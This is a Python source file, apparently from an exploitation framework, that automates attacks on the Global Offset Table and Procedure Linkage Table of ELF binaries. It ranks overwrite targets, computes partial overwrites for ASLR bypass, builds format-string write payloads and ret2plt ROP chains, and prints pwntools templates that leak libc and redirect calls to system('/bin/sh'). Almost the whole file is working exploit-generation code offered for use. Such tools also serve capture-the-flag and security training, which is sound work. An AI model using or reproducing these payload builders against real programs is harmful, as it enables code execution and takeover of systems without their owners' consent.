"""
GOT/PLT manipulation techniques.

Implements:
- GOT overwrite attacks
- PLT hijacking
- Partial GOT writes (for ASLR bypass)
- Function pointer replacement strategies
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32, u64, u32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class GOTEntry:
    """Represents a GOT entry."""
    name: str
    got_addr: int
    plt_addr: int
    resolved: bool = False
    resolved_addr: int = 0


@dataclass
class GOTAnalysis:
    """Complete GOT/PLT analysis of binary."""
    entries: List[GOTEntry] = field(default_factory=list)
    got_start: int = 0
    got_end: int = 0
    plt_start: int = 0
    plt_end: int = 0
    relro: str = "none"  # none, partial, full
    is_writable: bool = True


class GOTAnalyzer:
    """
    Analyze GOT/PLT for exploitation opportunities.

    Determines:
    - Which GOT entries are useful targets
    - RELRO status
    - Partial write possibilities
    """

    # High-value targets for GOT overwrite
    HIGH_VALUE_TARGETS = {
        # Execution
        "exit": "Hijack for shell on exit",
        "atexit": "Register cleanup handler",
        "_exit": "Direct exit syscall wrapper",

        # Format strings (overwrite with system)
        "printf": "Can become system() for fmt str",
        "puts": "Common leak + system target",
        "fprintf": "File printf",
        "sprintf": "Format to buffer",

        # Memory (overwrite hooks)
        "free": "Hook-like behavior via free(cmd)",
        "malloc": "Called frequently",

        # Comparison (return value manipulation)
        "strcmp": "Return 0 to bypass checks",
        "strncmp": "Return 0 to bypass checks",
        "memcmp": "Return 0 to bypass checks",

        # Dangerous (make safer or hijack)
        "gets": "Already dangerous",
        "strcpy": "Already dangerous",
    }

    def __init__(self, binary):
        """
        Initialize analyzer.

        Args:
            binary: Binary object
        """
        self.binary = binary
        self.bits = binary.bits if hasattr(binary, 'bits') else 64
        self.pack = p64 if self.bits == 64 else p32
        self.ptr_size = 8 if self.bits == 64 else 4

    def analyze(self) -> GOTAnalysis:
        """
        Perform complete GOT/PLT analysis.

        Returns:
            GOTAnalysis with all entries
        """
        result = GOTAnalysis()

        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            # Get RELRO status
            if hasattr(elf, 'relro'):
                result.relro = elf.relro or "none"
            result.is_writable = result.relro != "Full"

            # Get GOT entries
            if hasattr(elf, 'got'):
                for name, addr in elf.got.items():
                    plt_addr = elf.plt.get(name, 0) if hasattr(elf, 'plt') else 0

                    entry = GOTEntry(
                        name=name,
                        got_addr=addr,
                        plt_addr=plt_addr,
                    )
                    result.entries.append(entry)

                    # Track GOT bounds
                    if not result.got_start or addr < result.got_start:
                        result.got_start = addr
                    if addr + self.ptr_size > result.got_end:
                        result.got_end = addr + self.ptr_size

            # Get PLT bounds
            if hasattr(elf, 'plt'):
                for name, addr in elf.plt.items():
                    if not result.plt_start or addr < result.plt_start:
                        result.plt_start = addr
                    if addr + 0x10 > result.plt_end:
                        result.plt_end = addr + 0x10

        except Exception as e:
            logger.error(f"GOT analysis failed: {e}")

        return result

    def find_best_targets(self) -> List[Tuple[GOTEntry, str]]:
        """
        Find best GOT entries for overwrite.

        Returns:
            List of (entry, reason) tuples
        """
        analysis = self.analyze()
        targets = []

        for entry in analysis.entries:
            if entry.name in self.HIGH_VALUE_TARGETS:
                targets.append((entry, self.HIGH_VALUE_TARGETS[entry.name]))

        return targets

    def calculate_partial_write(
        self,
        got_addr: int,
        current_value: int,
        target_value: int,
    ) -> Optional[Dict[str, Any]]:
        """
        Calculate bytes needed for partial GOT overwrite.

        Useful when you can only write 1-2 bytes.

        Args:
            got_addr: GOT entry address
            current_value: Current resolved address
            target_value: Desired address

        Returns:
            Partial write strategy or None
        """
        result = {
            "feasible": False,
            "bytes_to_write": 0,
            "write_offset": 0,
            "payload": b"",
        }

        # Check how many bytes differ
        current_bytes = current_value.to_bytes(self.ptr_size, 'little')
        target_bytes = target_value.to_bytes(self.ptr_size, 'little')

        # Find first differing byte from LSB
        for i in range(self.ptr_size):
            if current_bytes[i] != target_bytes[i]:
                # Count consecutive differing bytes
                diff_count = 0
                for j in range(i, self.ptr_size):
                    if current_bytes[j] != target_bytes[j]:
                        diff_count = j - i + 1
                    else:
                        break

                if diff_count <= 2:
                    result["feasible"] = True
                    result["bytes_to_write"] = diff_count
                    result["write_offset"] = i
                    result["payload"] = target_bytes[i:i + diff_count]
                    result["write_addr"] = got_addr + i

                break

        return result


class GOTOverwriter:
    """
    Generate GOT overwrite exploits.

    Techniques:
    - Full pointer overwrite
    - Partial overwrite (low bytes)
    - Format string GOT write
    - Arbitrary write to GOT
    """

    def __init__(self, binary, libc_base: int = 0):
        """
        Initialize overwriter.

        Args:
            binary: Binary object
            libc_base: Libc base address (if known)
        """
        self.binary = binary
        self.libc_base = libc_base
        self.bits = binary.bits if hasattr(binary, 'bits') else 64
        self.pack = p64 if self.bits == 64 else p32
        self.analyzer = GOTAnalyzer(binary)

    def overwrite_with_system(
        self,
        target_func: str,
        system_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate GOT overwrite to replace function with system().

        Args:
            target_func: Function to replace (e.g., "puts")
            system_addr: Address of system()

        Returns:
            Overwrite strategy
        """
        result = {
            "feasible": False,
            "reason": "",
            "got_addr": 0,
            "payload": b"",
            "steps": [],
        }

        analysis = self.analyzer.analyze()

        # Check RELRO
        if analysis.relro == "Full":
            result["reason"] = "Full RELRO - GOT is read-only"
            return result

        # Find target entry
        target_entry = None
        for entry in analysis.entries:
            if entry.name == target_func:
                target_entry = entry
                break

        if not target_entry:
            result["reason"] = f"Function '{target_func}' not in GOT"
            return result

        result["feasible"] = True
        result["got_addr"] = target_entry.got_addr
        result["payload"] = self.pack(system_addr)
        result["steps"] = [
            f"1. GOT address for {target_func}: 0x{target_entry.got_addr:x}",
            f"2. Write system() address: 0x{system_addr:x}",
            f"3. Call {target_func}(\"/bin/sh\") for shell",
        ]

        return result

    def format_string_got_overwrite(
        self,
        target_func: str,
        new_value: int,
        fmt_offset: int,
    ) -> Dict[str, Any]:
        """
        Generate format string payload for GOT overwrite.

        Args:
            target_func: Function to overwrite
            new_value: New address to write
            fmt_offset: Stack offset for format string

        Returns:
            Format string attack info
        """
        result = {
            "feasible": False,
            "payload": b"",
            "explanation": "",
        }

        analysis = self.analyzer.analyze()

        if analysis.relro == "Full":
            result["explanation"] = "Full RELRO blocks GOT overwrite"
            return result

        # Find GOT entry
        got_addr = None
        for entry in analysis.entries:
            if entry.name == target_func:
                got_addr = entry.got_addr
                break

        if not got_addr:
            result["explanation"] = f"'{target_func}' not in GOT"
            return result

        result["feasible"] = True

        # Generate format string payload
        try:
            from pwnlib.fmtstr import fmtstr_payload

            payload = fmtstr_payload(
                fmt_offset,
                {got_addr: new_value},
                write_size='short' if self.bits == 64 else 'byte',
            )
            result["payload"] = payload

        except ImportError:
            # Manual format string construction
            result["payload"] = self._manual_fmtstr_payload(
                got_addr, new_value, fmt_offset
            )

        result["explanation"] = f"""
Format String GOT Overwrite:
- Target: {target_func}@GOT (0x{got_addr:x})
- New value: 0x{new_value:x}
- Format offset: {fmt_offset}

Usage:
  payload = {result['payload']!r}
  send(payload)
  call {target_func}("/bin/sh")  # Now calls 0x{new_value:x}
"""

        return result

    def _manual_fmtstr_payload(
        self,
        addr: int,
        value: int,
        offset: int,
    ) -> bytes:
        """Build manual format string payload for GOT overwrite."""
        # Simplified 2-byte write approach
        payload = b""

        if self.bits == 64:
            # Write 2 bytes at a time
            writes = [
                (addr, value & 0xffff),
                (addr + 2, (value >> 16) & 0xffff),
                (addr + 4, (value >> 32) & 0xffff),
            ]

            # Build payload with addresses at end
            for i, (write_addr, _) in enumerate(writes):
                payload += self.pack(write_addr)

            # Add format specifiers
            written = 0
            for i, (_, write_val) in enumerate(writes):
                to_write = (write_val - written) % 0x10000
                if to_write > 0:
                    payload += f"%{to_write}c".encode()
                payload += f"%{offset + i}$hn".encode()
                written = write_val

        else:
            # 32-bit: simpler layout
            writes = [
                (addr, value & 0xffff),
                (addr + 2, (value >> 16) & 0xffff),
            ]

            for write_addr, _ in writes:
                payload += p32(write_addr)

            written = len(payload)
            for i, (_, write_val) in enumerate(writes):
                to_write = (write_val - written) % 0x10000
                if to_write > 0:
                    payload += f"%{to_write}c".encode()
                payload += f"%{offset + i}$hn".encode()
                written = write_val

        return payload

    def leak_got_entry(
        self,
        func_name: str,
    ) -> Dict[str, Any]:
        """
        Generate strategy to leak GOT entry.

        Args:
            func_name: Function to leak

        Returns:
            Leak strategy
        """
        result = {
            "feasible": False,
            "got_addr": 0,
            "strategies": [],
        }

        analysis = self.analyzer.analyze()

        for entry in analysis.entries:
            if entry.name == func_name:
                result["feasible"] = True
                result["got_addr"] = entry.got_addr
                break

        if not result["feasible"]:
            return result

        result["strategies"] = [
            {
                "name": "puts/printf leak",
                "code": f"""
# Leak {func_name}@GOT using puts
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(0x{result['got_addr']:x})  # {func_name}@GOT
payload += p64(puts_plt)
send(payload)
leaked = u64(recv(6).ljust(8, b'\\x00'))
print(f"{func_name} @ {{hex(leaked)}}")
""",
            },
            {
                "name": "format string leak",
                "code": f"""
# Leak {func_name}@GOT using format string
# First find offset where GOT address appears
payload = b'%p.' * 20
send(payload)
# Then use specific offset
payload = f'%{{offset}}$s'.encode() + p64(0x{result['got_addr']:x})
""",
            },
            {
                "name": "arbitrary read primitive",
                "code": f"""
# Leak using arbitrary read
leaked = read_primitive(0x{result['got_addr']:x}, 8)
{func_name}_addr = u64(leaked)
""",
            },
        ]

        return result


class PLTHijacker:
    """
    PLT-based exploitation techniques.

    Useful when:
    - Need to call functions without resolving
    - ret2plt for leaking
    - PLT+N tricks
    """

    def __init__(self, binary):
        """
        Initialize hijacker.

        Args:
            binary: Binary object
        """
        self.binary = binary
        self.bits = binary.bits if hasattr(binary, 'bits') else 64
        self.pack = p64 if self.bits == 64 else p32

    def get_plt_entries(self) -> Dict[str, int]:
        """Get all PLT entries."""
        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary
            if hasattr(elf, 'plt'):
                return dict(elf.plt)
        except Exception:
            pass
        return {}

    def ret2plt_chain(
        self,
        calls: List[Tuple[str, List[int]]],
    ) -> bytes:
        """
        Build ret2plt ROP chain.

        Args:
            calls: List of (func_name, args) tuples

        Returns:
            ROP chain bytes
        """
        chain = []
        plt = self.get_plt_entries()

        # Find gadgets
        try:
            from supwngo.exploit.rop.gadgets import GadgetFinder
            finder = GadgetFinder(self.binary)
            pop_rdi = finder.find_pop_reg("rdi")
            pop_rsi = finder.find_pop_reg("rsi")
            pop_rdx = finder.find_pop_reg("rdx")
        except Exception:
            pop_rdi = pop_rsi = pop_rdx = None

        for func_name, args in calls:
            if func_name not in plt:
                logger.warning(f"{func_name} not in PLT")
                continue

            # Set up arguments
            if self.bits == 64:
                if args and pop_rdi:
                    chain.append(self.pack(pop_rdi.address))
                    chain.append(self.pack(args[0]))
                if len(args) > 1 and pop_rsi:
                    chain.append(self.pack(pop_rsi.address))
                    chain.append(self.pack(args[1]))
                if len(args) > 2 and pop_rdx:
                    chain.append(self.pack(pop_rdx.address))
                    chain.append(self.pack(args[2]))
            else:
                # 32-bit: args on stack after return address
                pass

            # Call function
            chain.append(self.pack(plt[func_name]))

        return b"".join(chain)

    def leak_libc_via_plt(
        self,
        leak_func: str = "puts",
        target_got: str = "puts",
    ) -> Dict[str, Any]:
        """
        Generate libc leak using PLT.

        Args:
            leak_func: Function to use for leaking (puts, printf, write)
            target_got: GOT entry to leak

        Returns:
            Leak strategy
        """
        result = {
            "feasible": False,
            "chain": b"",
            "code": "",
        }

        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            if leak_func not in elf.plt:
                result["reason"] = f"{leak_func} not in PLT"
                return result

            if target_got not in elf.got:
                result["reason"] = f"{target_got} not in GOT"
                return result

            result["feasible"] = True

            # Generate code
            result["code"] = f"""
# Libc leak via ret2plt
from pwn import *

elf = ELF('./binary')
p = process('./binary')

# ROP chain to leak {target_got}@GOT
rop = ROP(elf)
rop.call('{leak_func}', [elf.got['{target_got}']])
rop.call(elf.symbols['main'])  # Return to main for more ROP

payload = b'A' * offset  # Find overflow offset
payload += rop.chain()
p.sendline(payload)

# Parse leak
leak = u64(p.recv(6).ljust(8, b'\\x00'))
log.info(f"{target_got} @ {{hex(leak)}}")

# Calculate libc base
libc = ELF('./libc.so.6')
libc.address = leak - libc.symbols['{target_got}']
log.info(f"libc base @ {{hex(libc.address)}}")
"""

        except Exception as e:
            result["reason"] = str(e)

        return result

    def summary(self) -> str:
        """Get PLT analysis summary."""
        plt = self.get_plt_entries()

        return f"""
PLT Analysis
============
Entries: {len(plt)}

Available functions:
{chr(10).join(f'  - {name}: 0x{addr:x}' for name, addr in list(plt.items())[:10])}
{'  ...' if len(plt) > 10 else ''}

Useful for:
- ret2plt leaking (puts/printf GOT entries)
- Calling functions without libc leak
- ret2dlresolve preparation
"""
